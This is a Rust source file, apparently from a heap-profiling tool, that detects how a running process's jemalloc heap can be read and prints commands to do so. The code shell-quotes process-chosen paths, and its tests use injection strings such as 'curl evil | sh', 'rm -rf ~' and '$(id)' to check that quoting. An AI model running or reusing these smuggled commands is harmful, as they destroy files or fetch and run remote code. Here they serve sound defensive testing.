//! EXPERIMENTAL. What a running process has for its heap to be looked at,
//! and which command will do it.
//!
//! Which way a service's heap can be read depends on how the service was set
//! up, which whoever is looking at it may not know: whether it writes
//! snapshot files and where, whether it has a responder, whether it is a
//! Python that can be asked, whether its profile can be read from its
//! memory. This looks, and says: what was found, the commands that will
//! work, and what the service would have to be given for more.
//!
//! Nothing is written to the process and nothing is asked of it. What it
//! maps, the environment it was started with and its memory are read; its
//! responder's socket is connected to and let go without a word, to see who
//! answers; and its profile is read as `--snoop` reads it, to see whether it
//! can be.
//!
//! What the process chose is not trusted. The looking is given up on after
//! a while as a whole, since a process can make any part of it wait; what is
//! printed of the process's choosing has its control characters escaped;
//! and what goes into a command that is printed to be run is one word of
//! that command, or the command is not printed.

use std::path::{Path, PathBuf};
use std::time::{Duration, SystemTime};

use anyhow::{bail, Result};

use crate::ask::{self, python, responder, shown};
use crate::maps::Maps;
use crate::pycode;
use crate::root::{self, Root};
use crate::snoop::{self, Process};

/// How long reading the profile from memory may take, to say whether it can
/// be read: a profile that takes longer is said not to be readable, though
/// `--snoop` itself would wait longer for it.
const SNOOP_WITHIN: Duration = Duration::from_secs(30);
/// How long the whole of the looking may take.
pub const WITHIN: Duration = Duration::from_secs(90);
/// The most read of a process's environment, and of its name.
const MAX_ENVIRON_BYTES: u64 = 16 << 20;
const MAX_NAME_BYTES: u64 = 4096;
/// The most entries looked at in the folder the snapshots are in.
const MAX_ENTRIES: usize = 1 << 20;
/// Where the recipes are.
const GUIDE: &str = "docs/HEAP_SNAPSHOTS.md";

/// jemalloc's settings, as the environment the process was started with has
/// them. jemalloc also takes settings from the program itself and from
/// `/etc/malloc.conf`, which are not looked at: what is here is what was
/// asked for in the environment, not all that is in force.
#[derive(Debug, Default, Clone, PartialEq, Eq)]
pub struct Conf {
    /// The variable: `MALLOC_CONF`, or a prefixed build's own.
    pub variable: String,
    pub prof: Option<bool>,
    pub prefix: Option<String>,
    /// A snapshot every 2^this bytes allocated; none when negative or unset.
    pub lg_interval: Option<u32>,
}

impl Conf {
    /// The settings in a process's environment, if it has any. The last
    /// variable whose name ends in `MALLOC_CONF` and that sets `prof` is
    /// taken, else the last there is.
    pub fn in_environ(environ: &[u8]) -> Option<Conf> {
        let mut found: Option<Conf> = None;
        for kv in environ.split(|b| *b == 0) {
            let kv = String::from_utf8_lossy(kv);
            let Some((name, value)) = kv.split_once('=') else {
                continue;
            };
            if !name.ends_with("MALLOC_CONF") {
                continue;
            }
            let conf = Conf::parse(name, value);
            if conf.prof.is_some() || found.as_ref().is_none_or(|f| f.prof.is_none()) {
                found = Some(conf);
            }
        }
        found
    }

    fn parse(variable: &str, value: &str) -> Conf {
        let mut conf = Conf {
            variable: variable.to_string(),
            ..Conf::default()
        };
        // A later setting of the same option takes the place of an earlier.
        for (key, value) in value.split(',').filter_map(|opt| opt.split_once(':')) {
            let value = value.trim();
            match key.trim() {
                "prof" => conf.prof = value.parse().ok(),
                "prof_prefix" => conf.prefix = Some(value.to_string()),
                "lg_prof_interval" => {
                    conf.lg_interval = value
                        .parse::<i64>()
                        .ok()
                        .and_then(|lg| u32::try_from(lg).ok().filter(|lg| *lg < 64))
                }
                _ => {}
            }
        }
        conf
    }
}

/// The snapshot files of a process.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum Files {
    /// No `prof_prefix` in its environment: none are looked for.
    NoPrefix,
    /// A prefix that is no absolute path: it is relative to a working
    /// directory that is not looked up.
    Relative(String),
    /// Those under the prefix that are this process's.
    Under {
        prefix: String,
        count: usize,
        /// How long ago the newest was written, in seconds.
        newest: Option<u64>,
    },
    /// The folder could not be looked in, and why.
    Unread { prefix: String, why: String },
}

/// What reading the profile from memory came to.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Snooped {
    pub stacks: usize,
    /// Nothing was skipped and the profile held still.
    pub clean: bool,
}

/// What was found of a process.
#[derive(Debug)]
pub struct Facts {
    pub pid: u32,
    /// The pid the process knows itself by.
    pub own_pid: u32,
    /// Its name, as the kernel has it.
    pub name: String,
    /// The jemalloc it maps, as a file of that name.
    pub jemalloc: Option<String>,
    pub conf: Option<Conf>,
    pub files: Files,
    /// The responder's socket, or why it has none.
    pub responder: std::result::Result<PathBuf, String>,
    pub python: python::Would,
    /// Whether its stacks name Python functions: the code map's token.
    pub code_map: Option<String>,
    /// Which of the hooks' libraries it maps.
    pub hooks: Option<String>,
    pub snoop: std::result::Result<Snooped, String>,
}

/// [`check`], given up on after `limit`: the process's memory, its
/// environment, its socket and the folder its files are in are all its to
/// make slow.
pub fn check_within(process: &Process, dir: Option<&Path>, limit: Duration) -> Result<Facts> {
    let process = process.try_clone()?;
    let dir = dir.map(Path::to_path_buf);
    match snoop::run_within(limit, move || check(&process, dir.as_deref())) {
        Ok(facts) => facts,
        Err(snoop::Wait::TimedOut) => bail!(
            "gave up after {} s: looking at the process did not finish, perhaps because \
             something of it is on a filesystem that stalls, or its socket does not answer",
            limit.as_secs()
        ),
        Err(snoop::Wait::Panicked) => bail!("looking at the process failed unexpectedly"),
    }
}

/// Look at `process`. `dir` is where its responder's socket is, when that
/// is known better than its environment says.
pub fn check(process: &Process, dir: Option<&Path>) -> Result<Facts> {
    let root = process.root()?;
    let own_pid = snoop::own_pid(process);
    let maps_text = process.maps_text()?;
    let maps = Maps::parse(&maps_text);
    let mapped = |what: &str| {
        maps.mappings()
            .iter()
            .filter(|m| m.is_file())
            .find(|m| m.label().is_some_and(|name| name.contains(what)))
            .map(|m| m.path.clone())
    };
    let conf = process
        .read_capped("environ", MAX_ENVIRON_BYTES)
        .ok()
        .and_then(|environ| Conf::in_environ(&environ));
    let files = match conf.as_ref().and_then(|c| c.prefix.clone()) {
        None => Files::NoPrefix,
        Some(prefix) => files_under(&root, prefix, own_pid),
    };
    let sockets_in = dir.map_or_else(|| ask::socket_dirs(process), |dir| vec![dir.to_path_buf()]);
    let snoop = snoop::read_within(process, SNOOP_WITHIN)
        .map(|(snapshot, _)| Snooped {
            stacks: snapshot.samples.len(),
            clean: snapshot.live_read.as_ref().is_none_or(|r| r.is_clean()),
        })
        .map_err(|e| first_line(&format!("{e:#}")));
    Ok(Facts {
        pid: process.pid(),
        own_pid,
        name: process
            .read_capped("comm", MAX_NAME_BYTES)
            .map(|name| String::from_utf8_lossy(&name).trim_end().to_string())
            .unwrap_or_default(),
        jemalloc: mapped("jemalloc"),
        conf,
        files,
        responder: ask::in_the_first_of(&sockets_in, |dir| responder::answers(process, &root, dir))
            .map_err(|e| first_line(&format!("{e:#}"))),
        python: python::would(process)
            .unwrap_or_else(|e| python::Would::Cannot(first_line(&format!("{e:#}")))),
        code_map: pycode::token_of(&maps).map(str::to_string),
        hooks: mapped("libsysting_heap_"),
        snoop,
    })
}

/// A reason, as one line: what it says first. Of a process without a
/// responder it is said without whose it is (the report's own line says
/// that) and without how to have one (the report says that further down).
fn first_line(why: &str) -> String {
    let line = why.lines().next().unwrap_or_default();
    let line = line
        .split_once(" has no responder: ")
        .map_or(line, |(_, rest)| rest);
    let line = line
        .strip_suffix(" (the process calls systing_heap_hooks_listen to have one)")
        .unwrap_or(line);
    line.trim_end_matches(':').trim().to_string()
}

/// The folder a prefix's files are in and what their names begin with, as
/// jemalloc makes the names: the prefix, a dot, and the rest. None for a
/// prefix that is no absolute path. A prefix that ends in a slash names the
/// folder itself, and the names then begin with the dot.
fn folder_and_base(prefix: &str) -> Option<(&str, &str)> {
    let slash = prefix.rfind('/').filter(|_| prefix.starts_with('/'))?;
    Some((&prefix[..slash.max(1)], &prefix[slash + 1..]))
}

/// The files under `prefix` that are the process's, beneath its root.
fn files_under(root: &Root, prefix: String, own_pid: u32) -> Files {
    let Some((dir, base)) = folder_and_base(&prefix) else {
        return Files::Relative(prefix);
    };
    let unread = |why: String| Files::Unread {
        prefix: prefix.clone(),
        why,
    };
    // Opened as a name first: what filesystem it is on is known before
    // anything of it is read.
    let folder = match root.open_at(Path::new(dir), libc::O_PATH | libc::O_DIRECTORY) {
        Ok(folder) => folder,
        Err(e) => return unread(e.to_string()),
    };
    if root::on_remote_fs(&folder) {
        return unread("it is on a FUSE or network filesystem, and is not looked in".into());
    }
    use std::os::fd::AsRawFd;
    let entries = match std::fs::read_dir(format!("/proc/self/fd/{}", folder.as_raw_fd())) {
        Ok(entries) => entries,
        Err(e) => return unread(e.to_string()),
    };
    let mine = format!("{base}.{own_pid}.");
    let mut count = 0;
    let mut newest: Option<SystemTime> = None;
    for entry in entries.take(MAX_ENTRIES).flatten() {
        let name = entry.file_name();
        let name = name.to_string_lossy();
        if !name.starts_with(&mine) || !name.ends_with(".heap") {
            continue;
        }
        // A file, as a dump is: not a link to one, nor a folder or a pipe of
        // that name, which the command that loads dumps leaves alone.
        if !entry.file_type().is_ok_and(|t| t.is_file()) {
            continue;
        }
        count += 1;
        if let Ok(written) = entry.metadata().and_then(|m| m.modified()) {
            newest = Some(newest.map_or(written, |n| n.max(written)));
        }
    }
    Files::Under {
        prefix,
        count,
        newest: newest
            .and_then(|n| SystemTime::now().duration_since(n).ok())
            .map(|age| age.as_secs()),
    }
}

/// The absolute path `path` as one word of a command that is printed to be
/// run: as it is where a shell takes it for one word, else in single quotes.
/// None for what no command is printed with: a path that is not absolute
/// (every path here is, and one that began with a dash would be taken for an
/// option), one with a control character in it, and one that was not text,
/// which would be printed as another path than it is.
///
/// A prefix and a directory are the process's to choose, in the environment
/// it was started with, and what is printed here is copied into a shell by
/// whoever looks at the process, who may be root: a path must not be able
/// to end the command it is in and begin another, nor to write to the
/// terminal.
fn word(path: &str) -> Option<String> {
    let printable = |c: char| !c.is_control() && c != char::REPLACEMENT_CHARACTER;
    if !path.starts_with('/') || !path.chars().all(printable) {
        return None;
    }
    let plain = |c: char| c.is_ascii_alphanumeric() || "_@%+=:,./-".contains(c);
    Some(match path.chars().all(plain) {
        true => path.to_string(),
        false => format!("'{}'", path.replace('\'', "'\\''")),
    })
}

/// A way of looking at the heap that will work.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Way {
    /// The command, whole; None when a path in it cannot be printed in one.
    pub command: Option<String>,
    /// What it gives.
    pub gives: String,
}

/// A length of time, as a person says it.
fn ago(seconds: u64) -> String {
    match seconds {
        0..=119 => format!("{seconds} s"),
        120..=7199 => format!("{} min", seconds / 60),
        7200..=172_799 => format!("{} h", seconds / 3600),
        _ => format!("{} days", seconds / 86_400),
    }
}

/// An amount of memory, as a person says it.
fn bytes(lg: u32) -> String {
    match lg {
        0..=9 => format!("{} bytes", 1u64 << lg),
        10..=19 => format!("{} KiB", 1u64 << (lg - 10)),
        20..=29 => format!("{} MiB", 1u64 << (lg - 20)),
        _ => format!("{} GiB", 1u64 << (lg - 30).min(33)),
    }
}

impl Facts {
    /// Whether jemalloc was seen to profile: its profile was read from
    /// memory, or its responder answers, which it does not start otherwise.
    /// What the environment asks for is not that: a process can have the
    /// variable and no jemalloc, or a jemalloc built without profiling.
    fn profiles(&self) -> bool {
        self.snoop.is_ok() || self.responder.is_ok()
    }

    /// Whether the environment asks for profiling.
    fn asks_for_profiling(&self) -> Option<bool> {
        self.conf.as_ref().and_then(|c| c.prof)
    }

    /// Where the code map is looked for: the folder the prefix names, when
    /// the environment has one.
    fn code_map_dir(&self) -> Option<String> {
        let prefix = self.conf.as_ref().and_then(|c| c.prefix.as_deref())?;
        folder_and_base(prefix).map(|(dir, _)| dir.to_string())
    }

    /// What was found, a line for each thing looked for.
    fn found(&self) -> Vec<(&'static str, String)> {
        let mut lines = Vec::new();
        lines.push((
            "jemalloc",
            match &self.jemalloc {
                Some(file) => format!("yes: {}", shown(file)),
                None if self.snoop.is_ok() => "yes: in the program itself".into(),
                None => "not seen: no file of that name is mapped".into(),
            },
        ));
        lines.push((
            "profiling",
            match (self.profiles(), self.asks_for_profiling()) {
                (true, _) => "on".into(),
                (false, Some(true)) => "not seen, though its environment asks for it \
                                        (prof:true): jemalloc is not loaded or is built \
                                        without it, or nothing has been sampled yet"
                    .into(),
                (false, Some(false)) => "off: its environment says prof:false".into(),
                (false, None) => "not seen: no prof:true in its environment, and no \
                                  profile in its memory"
                    .into(),
            },
        ));
        lines.push((
            "snapshot files",
            match &self.files {
                Files::NoPrefix => "none: no prof_prefix in its environment".into(),
                Files::Relative(prefix) => format!(
                    "not looked for: {} is relative to its working directory",
                    shown(prefix)
                ),
                Files::Unread { prefix, why } => {
                    format!("not looked for under {}: {}", shown(prefix), shown(why))
                }
                Files::Under {
                    prefix,
                    count,
                    newest,
                } => {
                    let when = match self.conf.as_ref().and_then(|c| c.lg_interval) {
                        Some(lg) => format!("one every {} it allocates", bytes(lg)),
                        None => "when the service itself asks jemalloc for one".into(),
                    };
                    let newest = newest.map_or(String::new(), |n| {
                        format!(", the newest written {} ago", ago(n))
                    });
                    format!("{count} under {}{newest}; {when}", shown(prefix))
                }
            },
        ));
        lines.push((
            "hooks library",
            match &self.hooks {
                Some(file) => format!("loaded: {}", shown(file)),
                None => "not loaded".into(),
            },
        ));
        lines.push((
            "responder",
            match &self.responder {
                Ok(socket) => format!("answers at {}", shown(&socket.display().to_string())),
                Err(why) => format!("no: {}", shown(why)),
            },
        ));
        lines.push((
            "Python",
            match &self.python {
                python::Would::NotPython => "no: it maps no Python".into(),
                python::Would::Cannot(why) => format!("cannot be asked: {}", shown(why)),
                python::Would::Answer(version) => format!(
                    "CPython {version}: it can be asked, and answers when its main thread \
                     comes back to Python"
                ),
            },
        ));
        lines.push((
            "Python functions",
            match (&self.code_map, &self.python) {
                (Some(_), _) => format!(
                    "in its stacks; the code map is in {}",
                    self.code_map_dir().map_or_else(
                        || "the folder of its prof_prefix, which its environment does not \
                            say"
                        .to_string(),
                        |dir| shown(&dir)
                    )
                ),
                (None, python::Would::NotPython) => "none: it is no Python".into(),
                (None, _) => "not in its stacks: install(backtrace=\"python\") was not \
                              called"
                    .into(),
            },
        ));
        lines.push((
            "its memory",
            match &self.snoop {
                Ok(read) if read.clean => format!("read: {} stack(s)", read.stacks),
                Ok(read) => format!(
                    "read: {} stack(s), some skipped as the heap moved",
                    read.stacks
                ),
                Err(why) => format!("not read: {}", shown(why)),
            },
        ));
        lines
    }

    /// The ways that will work, the one to try first first.
    pub fn ways(&self) -> Vec<Way> {
        let pid = self.pid;
        let mut ways = Vec::new();
        // What names Python functions where no code map comes with the
        // dump: its folder, where that is known and can be printed.
        let (code_map, unnamed) = match (
            &self.code_map,
            self.code_map_dir().as_deref().and_then(word),
        ) {
            (Some(_), Some(dir)) => (format!(" --perf-map-dir {dir}"), ""),
            (Some(_), None) => (
                String::new(),
                "; its Python functions stay unnamed without --perf-map-dir and the folder \
                 its code map is in, which is not known here",
            ),
            (None, _) => (String::new(), ""),
        };
        if let Files::Under {
            prefix,
            count: 1..,
            newest,
        } = &self.files
        {
            ways.push(Way {
                command: word(prefix).map(|prefix| {
                    format!("systing-heap -o heap.duckdb --pid {pid} --latest-only {prefix}")
                }),
                gives: format!(
                    "jemalloc's own dump, the latest of each process that writes under that \
                     prefix; this one's is from {}",
                    newest.map_or("a time not known".to_string(), |n| format!(
                        "{} ago",
                        ago(n)
                    ))
                ),
            });
        }
        if let Ok(socket) = &self.responder {
            // In /tmp the folder need not be said.
            let dir = match socket.parent() {
                Some(dir) if dir != Path::new(ask::DEFAULT_DIR) => {
                    word(&dir.display().to_string()).map(|dir| format!(" --ask-dir {dir}"))
                }
                _ => Some(String::new()),
            };
            ways.push(Way {
                command: dir.map(|dir| {
                    format!("systing-heap -o heap.duckdb --pid {pid} --ask responder{dir}")
                }),
                gives: "jemalloc's own dump, as of now (experimental)".into(),
            });
        }
        if let (python::Would::Answer(_), true) = (&self.python, self.profiles()) {
            ways.push(Way {
                command: Some(format!(
                    "systing-heap -o heap.duckdb --pid {pid} --ask python{code_map}"
                )),
                gives: format!(
                    "jemalloc's own dump, as of now, if its main thread comes back to Python \
                     within 30 s; it writes to the process's memory (experimental){unnamed}"
                ),
            });
        }
        if self.snoop.is_ok() {
            ways.push(Way {
                command: Some(format!(
                    "systing-heap -o heap.duckdb --pid {pid} --snoop{code_map}"
                )),
                gives: format!(
                    "the profile as it is in memory now; stacks can be missing \
                     (experimental){unnamed}"
                ),
            });
        }
        ways
    }

    /// The commands that will work and can be printed, in the order of
    /// [`Facts::ways`].
    pub fn will_work(&self) -> Vec<String> {
        self.ways().into_iter().filter_map(|w| w.command).collect()
    }

    /// What the service would have to be given for more than it has: each
    /// with the recipe that says how.
    pub fn would_give_more(&self) -> Vec<(String, &'static str)> {
        let mut more = Vec::new();
        if !self.profiles() {
            more.push((
                match self.asks_for_profiling() {
                    Some(true) => "a profile to look at: its environment asks for one, and \
                                   jemalloc has to be loaded into it, and be one built with \
                                   profiling"
                        .to_string(),
                    _ => "anything at all: it has to be started with jemalloc and \
                          prof:true, which cannot be turned on in a process that runs"
                        .to_string(),
                },
                "Files at an interval",
            ));
            return more;
        }
        let writes_by_itself = self.conf.as_ref().is_some_and(|c| c.lg_interval.is_some());
        if !writes_by_itself {
            more.push((
                "snapshots over time, to see how the heap grew: prof_prefix and \
                 lg_prof_interval in its MALLOC_CONF"
                    .to_string(),
                "Files at an interval",
            ));
        }
        if self.responder.is_err() {
            more.push((
                "a dump of this moment, whatever its threads are doing: the responder \
                 (experimental)"
                    .to_string(),
                "Asked, by environment",
            ));
        }
        if self.code_map.is_none() && self.python != python::Would::NotPython {
            more.push((
                "Python functions in its stacks, with file and line: \
                 install(backtrace=\"python\")"
                    .to_string(),
                "Python functions in the stacks",
            ));
        }
        more
    }

    /// The whole of it, as it is printed.
    pub fn report(&self) -> String {
        use std::fmt::Write;
        let mut out = String::new();
        let itself = match self.own_pid == self.pid {
            true => String::new(),
            false => format!(", pid {} to itself", self.own_pid),
        };
        writeln!(out, "pid {} ({}{itself})\n", self.pid, shown(&self.name)).unwrap();
        for (what, said) in self.found() {
            writeln!(out, "  {what:.<20} {said}").unwrap();
        }
        let ways = self.ways();
        match ways.is_empty() {
            true => out.push_str("\nNothing here can look at its heap as it runs now.\n"),
            false => out.push_str("\nWhat will work, the one to try first first:\n\n"),
        }
        for way in &ways {
            match &way.command {
                Some(command) => writeln!(out, "  {command}").unwrap(),
                None => out.push_str(
                    "  (no command is printed for this one: a folder it would name has \
                     characters that no command is printed with)\n",
                ),
            }
            writeln!(out, "      {}", way.gives).unwrap();
        }
        let more = self.would_give_more();
        if !more.is_empty() {
            writeln!(
                out,
                "\nWhat the service would have to be given for more (the recipes are in {GUIDE}):\n"
            )
            .unwrap();
        }
        for (what, recipe) in more {
            writeln!(out, "  {what}\n      recipe: {recipe}").unwrap();
        }
        out
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn environ(vars: &[&str]) -> Vec<u8> {
        vars.iter()
            .flat_map(|v| v.bytes().chain(std::iter::once(0)))
            .collect()
    }

    #[test]
    fn jemallocs_settings_are_read_from_the_environment() {
        let conf = Conf::in_environ(&environ(&[
            "PATH=/bin",
            "MALLOC_CONF=prof:true,prof_prefix:/heap-dumps/jeprof,lg_prof_sample:19,lg_prof_interval:30",
        ]))
        .unwrap();
        assert_eq!(
            conf,
            Conf {
                variable: "MALLOC_CONF".into(),
                prof: Some(true),
                prefix: Some("/heap-dumps/jeprof".into()),
                lg_interval: Some(30),
            }
        );
        assert_eq!(Conf::in_environ(&environ(&["PATH=/bin"])), None);
    }

    #[test]
    fn a_prefixed_builds_variable_is_taken_and_the_one_that_sets_prof_wins() {
        let conf = Conf::in_environ(&environ(&[
            "MALLOC_CONF=background_thread:true",
            "_RJEM_MALLOC_CONF=prof:true,lg_prof_interval:-1",
        ]))
        .unwrap();
        assert_eq!(conf.variable, "_RJEM_MALLOC_CONF");
        assert_eq!(conf.prof, Some(true));
        // -1 is jemalloc's "no snapshots by interval".
        assert_eq!(conf.lg_interval, None);
        // An option given twice: the later one stands.
        let twice = Conf::in_environ(&environ(&["MALLOC_CONF=prof:false,prof:true"])).unwrap();
        assert_eq!(twice.prof, Some(true));
    }

    /// A service that has everything.
    fn facts() -> Facts {
        Facts {
            pid: 4242,
            own_pid: 7,
            name: "python3.14".into(),
            jemalloc: Some("/usr/lib/x86_64-linux-gnu/libjemalloc.so.2".into()),
            conf: Conf::in_environ(&environ(&[
                "MALLOC_CONF=prof:true,prof_prefix:/heap-dumps/jeprof,lg_prof_interval:30",
            ])),
            files: Files::Under {
                prefix: "/heap-dumps/jeprof".into(),
                count: 12,
                newest: Some(300),
            },
            responder: Ok(PathBuf::from("/run/heap/.systing-heap.7")),
            python: python::Would::Answer("3.14.7".into()),
            code_map: Some("1ce719a5fd5f0f13".into()),
            hooks: Some("/opt/systing/libsysting_heap_hooks.so".into()),
            snoop: Ok(Snooped {
                stacks: 40,
                clean: true,
            }),
        }
    }

    fn commands(facts: &Facts) -> Vec<String> {
        facts.will_work()
    }

    #[test]
    fn a_service_that_has_everything_is_read_every_way() {
        assert_eq!(
            commands(&facts()),
            [
                "systing-heap -o heap.duckdb --pid 4242 --latest-only /heap-dumps/jeprof",
                "systing-heap -o heap.duckdb --pid 4242 --ask responder --ask-dir /run/heap",
                "systing-heap -o heap.duckdb --pid 4242 --ask python --perf-map-dir /heap-dumps",
                "systing-heap -o heap.duckdb --pid 4242 --snoop --perf-map-dir /heap-dumps",
            ]
        );
        assert!(facts().would_give_more().is_empty());
        let report = facts().report();
        assert!(
            report.starts_with("pid 4242 (python3.14, pid 7 to itself)\n"),
            "{report}"
        );
        assert!(
            report.contains(
                "12 under /heap-dumps/jeprof, the newest written 5 min ago; one every 1 GiB"
            ),
            "{report}"
        );
    }

    #[test]
    fn a_service_with_jemalloc_alone_is_read_from_memory_and_told_what_more_there_is() {
        let plain = Facts {
            conf: Conf::in_environ(&environ(&["MALLOC_CONF=prof:true"])),
            files: Files::NoPrefix,
            responder: Err("pid 4242 has no responder: there is no /tmp/.systing-heap.7".into()),
            python: python::Would::Cannot(
                "the process is Python 3.13: asking needs CPython 3.14".into(),
            ),
            code_map: None,
            hooks: None,
            ..facts()
        };
        assert_eq!(
            commands(&plain),
            ["systing-heap -o heap.duckdb --pid 4242 --snoop"]
        );
        let recipes: Vec<_> = plain
            .would_give_more()
            .into_iter()
            .map(|(_, r)| r)
            .collect();
        assert_eq!(
            recipes,
            [
                "Files at an interval",
                "Asked, by environment",
                "Python functions in the stacks"
            ]
        );
    }

    #[test]
    fn a_responder_in_tmp_is_asked_without_its_folder_being_said() {
        let here = Facts {
            responder: Ok(PathBuf::from("/tmp/.systing-heap.7")),
            ..facts()
        };
        assert!(commands(&here)
            .contains(&"systing-heap -o heap.duckdb --pid 4242 --ask responder".to_string()));
    }

    #[test]
    fn a_service_without_profiling_is_told_that_nothing_works_until_it_is_started_again() {
        let off = Facts {
            jemalloc: None,
            conf: None,
            files: Files::NoPrefix,
            responder: Err("pid 4242 has no responder".into()),
            python: python::Would::NotPython,
            code_map: None,
            hooks: None,
            snoop: Err("no jemalloc heap profile found".into()),
            ..facts()
        };
        assert!(commands(&off).is_empty());
        let more = off.would_give_more();
        assert_eq!(more.len(), 1);
        assert!(more[0].0.contains("started with jemalloc and prof:true"));
        let report = off.report();
        assert!(
            report.contains("Nothing here can look at its heap as it runs now."),
            "{report}"
        );
    }

    #[test]
    fn a_python_is_not_asked_where_no_profiling_was_seen() {
        let python_alone = Facts {
            conf: None,
            files: Files::NoPrefix,
            responder: Err("no".into()),
            snoop: Err("no".into()),
            ..facts()
        };
        assert!(commands(&python_alone).is_empty());

        // Nor on the word of its environment, which a process can have
        // without the jemalloc it is for: what is asked of a Python is
        // written to its memory.
        let asked_for = Facts {
            jemalloc: None,
            conf: Conf::in_environ(&environ(&["MALLOC_CONF=prof:true"])),
            ..python_alone
        };
        assert!(commands(&asked_for).is_empty());
        let report = asked_for.report();
        assert!(
            report.contains("not seen, though its environment asks for it"),
            "{report}"
        );
        assert!(
            report.contains("Nothing here can look at its heap"),
            "{report}"
        );
    }

    #[test]
    fn what_a_process_names_cannot_write_to_the_terminal() {
        let named = Facts {
            name: "evil\x1b[2J".into(),
            ..facts()
        };
        assert!(!named.report().contains('\x1b'));
    }

    #[test]
    fn what_a_process_chose_is_one_word_of_a_command_or_is_not_printed() {
        assert_eq!(
            word("/heap-dumps/jeprof").as_deref(),
            Some("/heap-dumps/jeprof")
        );
        assert_eq!(word("/my dumps/je").as_deref(), Some("'/my dumps/je'"));
        assert_eq!(word("/x; rm -rf ~ #").as_deref(), Some("'/x; rm -rf ~ #'"));
        assert_eq!(word("/x$(id)`id`").as_deref(), Some("'/x$(id)`id`'"));
        assert_eq!(word("/it's").as_deref(), Some("'/it'\\''s'"));
        // What would be taken for an option is no path of a process's.
        assert_eq!(word("--output=/etc/passwd"), None);
        assert_eq!(word("relative/path"), None);
        assert_eq!(word("/x\n rm -rf ~"), None);
        assert_eq!(word("/x\x1b[2J"), None);
        // Bytes that were no text were read as this character.
        assert_eq!(word("/x\u{fffd}y"), None);
        assert_eq!(word(""), None);
    }

    #[test]
    fn a_prefix_is_a_folder_and_what_the_names_begin_with() {
        assert_eq!(
            folder_and_base("/heap-dumps/jeprof"),
            Some(("/heap-dumps", "jeprof"))
        );
        assert_eq!(folder_and_base("/jeprof"), Some(("/", "jeprof")));
        // jemalloc puts a dot and the pid after the prefix, whatever it ends in.
        assert_eq!(folder_and_base("/heap-dumps/"), Some(("/heap-dumps", "")));
        assert_eq!(folder_and_base("jeprof"), None);
        assert_eq!(folder_and_base("dumps/jeprof"), None);
    }

    #[test]
    fn a_prefix_that_would_begin_another_command_does_not() {
        let hostile = |prefix: &str| Facts {
            conf: Conf::in_environ(&environ(&[&format!(
                "MALLOC_CONF=prof:true,prof_prefix:{prefix}"
            )])),
            files: Files::Under {
                prefix: prefix.into(),
                count: 3,
                newest: Some(1),
            },
            responder: Ok(PathBuf::from("/run/a b/.systing-heap.7")),
            ..facts()
        };
        assert_eq!(
            commands(&hostile("/d/x; curl evil | sh #")),
            [
                "systing-heap -o heap.duckdb --pid 4242 --latest-only '/d/x; curl evil | sh #'",
                "systing-heap -o heap.duckdb --pid 4242 --ask responder --ask-dir '/run/a b'",
                "systing-heap -o heap.duckdb --pid 4242 --ask python --perf-map-dir /d",
                "systing-heap -o heap.duckdb --pid 4242 --snoop --perf-map-dir /d",
            ]
        );
        // With a control character in it, the command that would hold it is
        // not printed, and no line of the report has the character. The way
        // is still one that works, and is said to be.
        let worse = hostile("/d\x1b[2J/x\nrm -rf ~");
        assert!(!commands(&worse).iter().any(|c| c.contains("--latest-only")));
        assert_eq!(worse.ways().len(), commands(&worse).len() + 1);
        let report = worse.report();
        assert!(!report.contains('\x1b'), "{report:?}");
        assert!(!report.contains("\nrm -rf"), "{report:?}");
        assert!(
            report.contains("no command is printed for this one"),
            "{report}"
        );
        // Python functions are not said to be named from a folder that is
        // not printed.
        assert!(commands(&worse)
            .iter()
            .all(|c| !c.contains("--perf-map-dir")));
        assert!(
            report.contains("stay unnamed without --perf-map-dir"),
            "{report}"
        );
    }

    #[test]
    fn a_reason_is_said_in_one_short_line() {
        assert_eq!(
            first_line(
                "pid 7 has no responder: there is no /tmp/.systing-heap.7 (the process \
                 calls systing_heap_hooks_listen to have one)"
            ),
            "there is no /tmp/.systing-heap.7"
        );
        assert_eq!(
            first_line("no jemalloc profile found in this process:\n  more"),
            "no jemalloc profile found in this process"
        );
        // What is in brackets is kept where it is the reason.
        let denied = "opening /proc/7/mem: it needs the same user (any other, root \
                      included, needs CAP_SYS_PTRACE): Permission denied (os error 13)";
        assert_eq!(first_line(denied), denied);
    }

    #[test]
    fn times_and_sizes_are_said_as_a_person_says_them() {
        assert_eq!(
            [ago(5), ago(300), ago(7200), ago(200_000)],
            ["5 s", "5 min", "2 h", "2 days"]
        );
        assert_eq!(
            [bytes(19), bytes(25), bytes(30)],
            ["512 KiB", "32 MiB", "1 GiB"]
        );
    }
}
